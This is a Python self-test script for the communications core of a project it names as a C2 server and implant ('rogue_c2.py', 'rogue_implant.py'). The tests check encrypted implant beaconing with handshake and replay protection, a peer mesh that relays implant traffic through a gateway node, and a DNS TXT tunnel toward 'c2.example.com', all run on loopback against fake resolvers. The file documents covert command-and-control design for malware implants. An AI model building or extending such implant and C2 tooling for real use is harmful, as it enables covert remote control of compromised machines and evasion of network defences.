#!/usr/bin/env python3
"""
ROGUE V2 CORE SELFTEST
======================
Validates the canonical comms core (rogue_v2_core.py) before it is embedded
into rogue_c2.py / rogue_implant.py. Run from the repo root:

    python3 tests/selftest_v2.py

Covers:
  1. ECDH hello handshake + op round trip (forward-secrecy mode)
  2. Tamper / replay / wrong-key rejection
  3. PSK per-message mode round trip
  4. Server session isolation (unknown label rejected)
  5. Mesh: encrypted discovery + gateway relay round trip (loopback UDP)
  6. DNS tunnel TXT round trip against a local fake resolver
  7. Stream framing (length-prefixed frames)
"""

import base64
import json
import os
import socket
import struct
import sys
import threading
import time

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))

from rogue_v2_core import (  # noqa: E402
    RogueMesh, RogueV2Client, RogueV2Server, rv2_b64d, rv2_dns_query_txt,
    rv2_dns_tunnel_send, rv2_frame_recv, rv2_frame_send, rv2_gen_static_key,
    rv2_label, rv2_root_label, rv2_secret_bytes,
)

PASS = 0
FAIL = 0


def check(name, cond, detail=""):
    global PASS, FAIL
    if cond:
        PASS += 1
        print("  [PASS] %s" % name)
    else:
        FAIL += 1
        print("  [FAIL] %s %s" % (name, detail))


SECRET = "c0ffee" * 8  # 48 hex chars -> 24 bytes
SECRET2 = "deadbeef" * 8
PRIV, PUB = rv2_gen_static_key()
assert PRIV and PUB, "X25519 backend required for this test run"


def test_ecdh_roundtrip():
    print("\n[1] ECDH hello handshake + op round trip")
    cli = RogueV2Client(SECRET, base64.b64encode(PUB).decode(), implant_id="host1_user_1")
    srv = RogueV2Server(SECRET, static_priv_raw=PRIV)

    hello = cli.build_hello()
    inner, label, is_new = srv.recv(hello, ip="10.0.0.5")
    check("server accepts hello", is_new and inner.get("o") == "__hello__" and inner.get("id") == "host1_user_1")
    check("label derived deterministically", label == rv2_label(SECRET, "host1_user_1"))

    ack = srv.reply(label, {"o": "__hello_ack__", "bid": "bot_x"})
    inner2 = cli.handle_hello_ack(ack)
    check("client verifies hello_ack", inner2.get("bid") == "bot_x")

    op_wire = cli.seal_op({"o": "beacon", "peers": ["aaa", "bbb"]})
    inner3, label3, _ = srv.recv(op_wire, ip="10.0.0.5")
    check("server opens beacon op", inner3.get("o") == "beacon" and label3 == label)
    check("extra fields survive", inner3.get("peers") == ["aaa", "bbb"])

    resp = srv.reply(label, {"o": "pong"})
    check("client opens pong", cli.open_op(resp).get("o") == "pong")


def test_rejections():
    print("\n[2] Tamper / replay / wrong-key rejection")
    cli = RogueV2Client(SECRET, base64.b64encode(PUB).decode(), implant_id="t1")
    srv = RogueV2Server(SECRET, static_priv_raw=PRIV)
    srv.recv(cli.build_hello())
    wire = cli.seal_op({"o": "beacon"})

    # replay
    replayed = False
    try:
        srv.recv(wire)
        srv.recv(wire)  # second time = replay
    except Exception as e:
        replayed = "replay" in str(e)
    check("replay rejected", replayed)

    # tamper (flip a byte in the ciphertext region)
    env = json.loads(wire.decode())
    ct = bytearray(rv2_b64d(env["c"]))
    ct[0] ^= 0xFF
    env["c"] = base64.b64encode(bytes(ct)).decode()
    tampered = json.dumps(env).encode()
    bad = False
    try:
        srv.recv(tampered)
    except Exception:
        bad = True
    check("tampered frame rejected", bad)

    # wrong-key client cannot authenticate
    evil = RogueV2Client(SECRET2, base64.b64encode(PUB).decode(), implant_id="t2")
    evil_wire = evil.build_hello()
    bad = False
    try:
        srv.recv(evil_wire)
    except Exception:
        bad = True
    check("wrong operator secret rejected", bad)

    # client rejects server frames signed with a different secret (fake C2)
    fake_srv = RogueV2Server(SECRET2, static_priv_raw=PRIV)
    cli2 = RogueV2Client(SECRET, base64.b64encode(PUB).decode(), implant_id="t3")
    srv2 = RogueV2Server(SECRET, static_priv_raw=PRIV)
    srv2.recv(cli2.build_hello())
    label = rv2_label(SECRET, "t3")
    ack = srv2.reply(label, {"o": "__hello_ack__", "bid": "b"})
    check("client accepts genuine ack", cli2.handle_hello_ack(ack).get("bid") == "b")

    # unknown label on server
    bad = False
    try:
        srv.reply(rv2_label(SECRET, "ghost"), {"o": "x"})
    except Exception:
        bad = True
    check("reply to unknown session rejected", bad)


def test_psk_mode():
    print("\n[3] PSK per-message mode round trip")
    cli = RogueV2Client(SECRET, mode="p", implant_id="psk1")
    srv = RogueV2Server(SECRET, static_priv_raw=PRIV)
    srv.recv(cli.build_hello())
    wire = cli.seal_op({"o": "beacon"})
    inner, label, _ = srv.recv(wire)
    check("server opens psk frame", inner.get("o") == "beacon")
    resp = srv.reply(label, {"o": "pong"})
    check("client opens psk reply", cli.open_op(resp).get("o") == "pong")
    # wrong secret
    cli2 = RogueV2Client(SECRET2, mode="p", implant_id="psk2")
    srv2 = RogueV2Server(SECRET, static_priv_raw=PRIV)
    bad = False
    try:
        srv2.recv(cli2.seal_op({"o": "beacon"}))
    except Exception:
        bad = True
    check("psk wrong secret rejected", bad)


def test_mesh_relay():
    print("\n[4] Mesh: discovery + gateway relay round trip (loopback)")
    # node A: non-gateway implant. node B: gateway (has C2 path)
    results = {}

    def mk(name, ports, gw, on_root=None):
        m = RogueMesh(SECRET, rv2_label(SECRET, name), ports=ports,
                      announce_interval=30, log=lambda *a: None)
        m.set_gateway(gw)
        if on_root:
            m.on_root = on_root
        return m

    # B's on_root acts like the C2: echoes the raw frame back (reply path)
    def root_echo(raw):
        results["root_saw"] = raw
        return raw + b"|REPLY"

    A = mk("nodeA", (17708, 17709, 17710), gw=False)
    B = mk("nodeB", (17708, 17709, 17710), gw=True, on_root=root_echo)
    A.on_me = lambda raw: results.__setitem__("A_got", raw)

    assert A.start(), "mesh A bind failed"
    assert B.start(), "mesh B bind failed"
    time.sleep(1.2)  # announces propagate both ways

    check("B learned A", rv2_label(SECRET, "nodeA") in B.peers)
    check("A learned B (gw)", B.peers.get(rv2_label(SECRET, "nodeB"), {}).get("gw") is True)

    payload = b'{"v":2,"x":"encrypted-frame-bytes"}'
    ok = A.send_data(payload, rv2_root_label(SECRET))
    check("A sent data toward root", ok)
    time.sleep(0.8)
    check("gateway B received raw frame", results.get("root_saw") == payload)
    check("response routed back to A", results.get("A_got") == payload + b"|REPLY")

    A.stop()
    B.stop()


def test_dns_tunnel():
    print("\n[5] DNS tunnel TXT round trip (local fake resolver)")
    import random

    RESP_TXT = base64.b64encode(b'{"v":2,"o":"pong-encrypted"}').decode()

    def fake_resolver():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.bind(("127.0.0.1", 15353))
        s.settimeout(8)
        while True:
            try:
                data, addr = s.recvfrom(65535)
            except socket.timeout:
                return
            qid = struct.unpack(">H", data[:2])[0]
            # parse qname
            off = 12
            labels = []
            while off < len(data) and data[off] != 0:
                ln = data[off]
                labels.append(data[off + 1:off + 1 + ln].decode("ascii", "replace"))
                off += 1 + ln
            # build response: header + question + TXT answer
            qname = b""
            for lb in labels:
                qname += bytes([len(lb)]) + lb.encode()
            resp = struct.pack(">HHHHHH", qid, 0x8180, 1, 1, 0, 0)
            resp += qname + b"\x00" + struct.pack(">HH", 16, 1)
            resp += b"\xc0\x0c" + struct.pack(">HHIH", 16, 1, 60, len(RESP_TXT) + 1)
            resp += bytes([len(RESP_TXT)]) + RESP_TXT.encode()
            s.sendto(resp, addr)

    t = threading.Thread(target=fake_resolver, daemon=True)
    t.start()
    time.sleep(0.3)

    wire = b'{"v":2,"m":"e","s":"abcd","c":"ciphertext-here"}' * 3
    got = rv2_dns_tunnel_send(wire, "c2.example.com", "127.0.0.1", seq=7, resolver_port=15353)
    check("dns tunnel round trip (multiline)", got == base64.b64decode(RESP_TXT))


def test_framing():
    print("\n[6] Stream framing (socketpair)")
    a, b = socket.socketpair()
    payload = os.urandom(70000)  # > 65535 to exercise the read loop
    threading.Thread(target=lambda: (rv2_frame_send(a, payload), a.close()), daemon=True).start()
    got = rv2_frame_recv(b)
    check("large frame survives framing", got == payload)


def test_labels():
    print("\n[7] Label determinism + root label")
    check("label deterministic", rv2_label(SECRET, "x") == rv2_label(SECRET, "x"))
    check("label distinct per id", rv2_label(SECRET, "x") != rv2_label(SECRET, "y"))
    check("label differs across secrets", rv2_label(SECRET, "x") != rv2_label(SECRET2, "x"))
    check("root label stable", rv2_root_label(SECRET) == rv2_label(SECRET, "__C2_ROOT__"))


if __name__ == "__main__":
    print("ROGUE V2 CORE SELFTEST")
    print("======================")
    print("backend: %s" % ("X25519+AESGCM" if PRIV else "PSK-only"))
    test_labels()
    test_ecdh_roundtrip()
    test_rejections()
    test_psk_mode()
    test_mesh_relay()
    test_dns_tunnel()
    test_framing()
    print("\n======================")
    print("TOTAL: %d passed, %d failed" % (PASS, FAIL))
    sys.exit(1 if FAIL else 0)
